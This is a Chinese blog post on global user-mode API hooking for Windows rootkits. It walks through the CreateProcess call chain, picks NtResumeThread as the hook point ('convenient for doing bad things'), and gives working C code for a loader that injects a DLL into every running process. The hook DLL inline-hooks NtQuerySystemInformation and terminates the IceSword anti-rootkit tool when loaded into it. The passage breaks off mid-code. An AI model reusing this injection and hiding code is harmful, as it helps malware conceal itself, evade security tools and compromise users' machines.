    <content type="html"><![CDATA[<p>挂钩一直是Hack 编程中永恒的主题，基本高级的Rootkit 程序多多少少都会使用Hook 技术。<br>似乎Hook 都被讲烂了，不论是Ring3 的还是Ring0 的网上都有例子。Ring0 的毋庸置疑当然<br>是全局的了，这里说说ring3 的全局hook。Ring 3 有Ring 3 的优势，稳定是压倒一切的，<br>因此Mcafee 和其他一些商业的安全软件都还是使用了Ring3 的Hook 技术，无论如何用户是<br>无法接受蓝屏和死机的。</p><p>感兴趣的可以装个Rootkit unhooker 自己看看。 :)</p><h2 id="1-以往的Ring-3全局Hook"><a href="#1-以往的Ring-3全局Hook" class="headerlink" title="1. 以往的Ring 3全局Hook"></a>1. 以往的Ring 3全局Hook</h2><p>纵观网上流行的全局Hook 程序都只用了一个Windows API， SetWindowsHookEx，此函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(      </span><br><span class="hljs-params">    <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">    HOOKPROC lpfn,</span><br><span class="hljs-params">    HINSTANCE hMod,</span><br><span class="hljs-params">    DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">idhook   安装的钩子类型，如 WH_GETMESSAGE，WH_KEYBOARD 等<br>lpfn     hook <span class="hljs-function"><span class="hljs-keyword">procedure</span> 的指针</span><br><span class="hljs-function"><span class="hljs-title">hmod</span>     包含 <span class="hljs-title">hook</span> <span class="hljs-title">procedure</span> <span class="hljs-title">DLL</span> 的<span class="hljs-title">handle</span></span><br><span class="hljs-function"><span class="hljs-title">dwThread</span> 为0</span><br></code></pre></td></tr></table></figure><p>使用这个这个API 时候有问题的，只能挂接系统中的所有G U I线程，换句通俗的话说就是有界面<br>的程序，Windows console 类的程序就无能为力了。</p><p>还有一种通过插入注册表来实现</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs<br></code></pre></td></tr></table></figure><p>这种方法简单，但是还是只能挂钩GUI 程序，并且这个键值已经被广大HIPS 所关注，吃力不讨好。</p><p>以上两种效果不好，因此有人有开始另外的做法，枚举所有进程，插入和挂钩 NtCreateProcess<br>这是非常自然的想法，似乎也把问题解决了，但是仔细思考一下，就会发现很多问题。</p><p>a. 时机不对，在NtCreateProcess函数被调用时进程并没有真正被创建，我们无法执行HOOK操作，<br>   而当NtCreateProcess返回时，进程又已经开始运行</p><p>b. 如果是Windows console 创建的进程，你如何去监控这个调用呢？这么说似乎比较抽象，你可<br>   以这么理解，直接在命令行下，cmd，cmd，cmd …. 你可以监控到最后一个cmd 吗，如果只<br>   用SetWindowsHookEx</p><p>c. 是否正好站在了华容道，是否足够底层。</p><p>似乎很费劲</p><h2 id="2-分析系统创建进程过程，寻找方法"><a href="#2-分析系统创建进程过程，寻找方法" class="headerlink" title="2. 分析系统创建进程过程，寻找方法"></a>2. 分析系统创建进程过程，寻找方法</h2><p>关于这方面内容，可以参考毛德操老师的两篇文章</p><p>《漫谈兼容内核之十七:再谈Windows的进程创建》<br>《漫谈兼容内核之二十二:Windows线程的调度和运行》</p><p>下面是他的blog 链接：<br><a href="http://hi.baidu.com/fatbsd/blog">http://hi.baidu.com/fatbsd/blog</a></p><p>CreateProcess 是 Kernel32.dll 的导出函数。</p><p>操起WinDbg，剁了一下： Windows 2003 SP2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">lkd&gt; uf CreateProcessW<br>kernel32!CreateProcessW:<br>7c802474 8bff             mov     edi,edi<br>7c802476 55               push    ebp<br>7c802477 8bec             mov     ebp,esp<br>7c802479 6a00             push    0x0<br>7c80247b ff752c           push    dword ptr [ebp+0x2c]<br>7c80247e ff7528           push    dword ptr [ebp+0x28]<br>7c802481 ff7524           push    dword ptr [ebp+0x24]<br>7c802484 ff7520           push    dword ptr [ebp+0x20]<br>7c802487 ff751c           push    dword ptr [ebp+0x1c]<br>7c80248a ff7518           push    dword ptr [ebp+0x18]<br>7c80248d ff7514           push    dword ptr [ebp+0x14]<br>7c802490 ff7510           push    dword ptr [ebp+0x10]<br>7c802493 ff750c           push    dword ptr [ebp+0xc]<br>7c802496 ff7508           push    dword ptr [ebp+0x8]<br>7c802499 6a00             push    0x0<br>7c80249b e8a6ac0200       call    kernel32!CreateProcessInternalW (7c82d146)<br>7c8024a0 5d               pop     ebp<br>7c8024a1 c22800           ret     0x28<br><br>lkd&gt; uf CreateProcessInternalW<br>....<br>7c82cf8f ff159814807c call dword ptr [kernel32!_imp__NtCreateProcessEx (7c801498)]<br>....<br>7c82daa2 ff159414807c call dword ptr [kernel32!_imp__NtCreateThread (7c801494)]<br>....<br>7c82dbdc ff158814807c call dword ptr [kernel32!_imp__NtResumeThread (7c801488)]<br></code></pre></td></tr></table></figure><p>大概流程如下:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Kernel32!CreateProcessW<br>Kernel32!CreateProcessInternalW<br>ntdll!NtCreateProcessEx<br>ntdll!NtCreateThread<br>ntdll!NtResumeThread<br></code></pre></td></tr></table></figure><p>因为进程创建后，Windows 必须为它创建一个主线程，然后等待操作系统调度它。所以调用NtResumeThread的时候，就是我们Hook的最佳时机，因为此时创建进程的主要工作已经完成，但是进程并没有调度起来，呵呵，方便干坏事啊。</p><h2 id="3-具体代码实现"><a href="#3-具体代码实现" class="headerlink" title="3. 具体代码实现"></a>3. 具体代码实现</h2><p>基本思路已经清晰了，这里还几个问题。</p><p>a. NtResumeThread 函数并不是创建进程才调用，我们怎么区分出哪个是创建进程时<br>   调用的NtResumeThread呢？</p><p>其实现实起来不困难，先枚举系统进程一次，将系统进程中NtResumeThread 都挂钩上。每次拦截到<br>NTResumeThread 是判断NtResumeThread 的头几个字节是否已经被修改，如果没有则是创建新进程的调用。</p><p>b. 用什么方法Hook ， IAT、Inline？ 总的架构？</p><p>  这种代码写起来还是Inline Hook 来的舒服，修改函数调用头几个字节。<br>  枚举系统所有进程是不可避免的，因此要写个loader 将我们编写的DLL 插入系统所有进程。发现有进进程<br>  创建时，将DLL 插入新进程。</p><p>  下面代码演示，Hook NtQuerySystemInformation，因为篇幅等原因只有整体框架和关键代码。<br>  Hook 也不是不是我们这次的主要内容，感兴趣的可以参考</p><p>  <a href="http://www.xfocus.net/articles/200403/681.html">http://www.xfocus.net/articles/200403/681.html</a></p><p>c. 在多线程的环境下是否可靠？</p><p>  使用关键代码段，互斥锁，效果还可以。</p><p>Loader：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br><span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">strcpy</span>(CurPath, <span class="hljs-string">&quot;C:\\WINDOWS\\system32\\Hook.dll&quot;</span>);<br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess,<br>                                             <span class="hljs-literal">NULL</span>,<br>                                             len,<br>                                             MEM_COMMIT,<br>                                             PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>            (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>        GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    CreateRemoteThread(hProcess,<br>                       <span class="hljs-literal">NULL</span>,<br>                       <span class="hljs-number">0</span>,    <br>                       pfnThreadRtn,<br>                       pszLibFileRemote,<br>                       <span class="hljs-number">0</span>,<br>                       <span class="hljs-literal">NULL</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TotalInject</span><span class="hljs-params">()</span><br>&#123;<br>    HANDLE         hProcessSnap = <span class="hljs-literal">NULL</span>;<br>    BOOL           bRet      = FALSE;<br>    PROCESSENTRY32 pe32      = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-comment">//  Take a snapshot of all processes in the system.</span><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">//  Fill in the size of the structure before using it.</span><br><br>    pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br><br>    <span class="hljs-comment">//  Walk the snapshot of the processes, and for each process,</span><br>    <span class="hljs-comment">//  display information.</span><br><br>    <span class="hljs-keyword">if</span> (Process32First(hProcessSnap, &amp;pe32))<br>    &#123;<br><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>                HANDLE hProcess;<br>                <span class="hljs-comment">// Get the actual priority class.</span><br>                hProcess = OpenProcess (PROCESS_ALL_ACCESS,<br>                                        FALSE,<br>                                       pe32.th32ProcessID);<br>        inject(hProcess);<br>        CloseHandle(hProcess);<br><br>        &#125;<br>        <span class="hljs-keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));<br><br>    &#125;<br><br>    <span class="hljs-comment">// Do not forget to clean up the snapshot object.</span><br>        EnableDebugPrivilege(<span class="hljs-number">0</span>);<br><br>    CloseHandle (hProcessSnap);<br>    <span class="hljs-keyword">return</span> ;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>Hook.dll: 关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>BOOL g_bHook = FALSE;<br><br><span class="hljs-keyword">typedef</span> LONG NTSTATUS;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS               ((NTSTATUS)0x00000000L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)</span><br><span class="hljs-keyword">typedef</span> ULONG SYSTEM_INFORMATION_CLASS;<br><span class="hljs-keyword">typedef</span> ULONG THREADINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG PROCESSINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG KPRIORITY;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMORY_BASIC_INFORMATION_SIZE 28</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_BASIC_INFORMATION</span> &#123;</span><br>    NTSTATUS ExitStatus;<br>    PNT_TIB TebBaseAddress;<br>    CLIENT_ID ClientId;<br>    KAFFINITY AffinityMask;<br>    KPRIORITY Priority;<br>    KPRIORITY BasePriority;<br>&#125; THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_BASIC_INFORMATION</span> &#123;</span> <span class="hljs-comment">// Information Class 0</span><br>NTSTATUS ExitStatus;<br>PVOID PebBaseAddress;<br>KAFFINITY AffinityMask;<br>KPRIORITY BasePriority;<br>ULONG UniqueProcessId;<br>ULONG InheritedFromUniqueProcessId;<br>&#125; PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYSYSTEMINFORMATION)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  OUT PVOID               SystemInformation,</span><br><span class="hljs-params">  IN ULONG                SystemInformationLength,</span><br><span class="hljs-params">  OUT PULONG              ReturnLength OPTIONAL )</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTRESUMETHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYINFORMATIONTHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN HANDLE ThreadHandle,</span><br><span class="hljs-params">  IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="hljs-params">  OUT PVOID ThreadInformation,</span><br><span class="hljs-params">  IN ULONG ThreadInformationLength,</span><br><span class="hljs-params">  OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall * NTQUERYINFORMATIONPROCESS)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ProcessHandle,</span><br><span class="hljs-params">IN PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">OUT PVOID ProcessInformation,</span><br><span class="hljs-params">IN ULONG ProcessInformationLength,</span><br><span class="hljs-params">OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br>NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = <span class="hljs-literal">NULL</span>;<br>NTRESUMETHREAD g_pfNtResumeThread = <span class="hljs-literal">NULL</span>;<br>BYTE g_OldNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>BYTE g_OldNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>DWORD dwIdOld = <span class="hljs-number">0</span>;<br>CRITICAL_SECTION cs;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span>;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span>;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span>;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HANDLE hModule,</span><br><span class="hljs-params">                       DWORD  ul_reason_for_call,</span><br><span class="hljs-params">                       LPVOID lpReserved )</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        &#123;<br>             InitializeCriticalSection(&amp;cs);<br>             <span class="hljs-type">char</span> Name[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>             GetModuleFileName(<span class="hljs-literal">NULL</span>, Name, MAX_PATH);<br>             <span class="hljs-comment">// 杀杀冰刃玩玩</span><br>             <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(Name, <span class="hljs-string">&quot;IceSword.exe&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>             &#123;<br>                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,<br>                                              <span class="hljs-number">0</span>,<br>                                              GetCurrentProcessId());<br>                TerminateProcess(hProcess, <span class="hljs-number">0</span>);<br>                CloseHandle(hProcess);<br>             &#125;<br>            <span class="hljs-keyword">if</span>(!g_bHook)<br>            &#123;<br>                HookOn();<br>            &#125;<br>            <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>               MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Process Attach&quot;</span>, <span class="hljs-string">&quot;Remote Dll&quot;</span>, MB_OK);<br>            <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">if</span>(g_bHook)<br>        &#123;<br>            HookOff();<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>            MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Off!&quot;</span>, <span class="hljs-string">&quot;Hook Off&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            DeleteCriticalSection(&amp;cs);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">EnableDebugPrivilege</span><span class="hljs-params">(BOOL fEnable)</span> &#123;<br><br>   <span class="hljs-comment">// Enabling the debug privilege allows the application to see</span><br>   <span class="hljs-comment">// information about service applications</span><br>   BOOL fOk = FALSE;    <span class="hljs-comment">// Assume function fails</span><br>   HANDLE hToken;<br><br>   <span class="hljs-comment">// Try to open this process&#x27;s access token</span><br>   <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,<br>      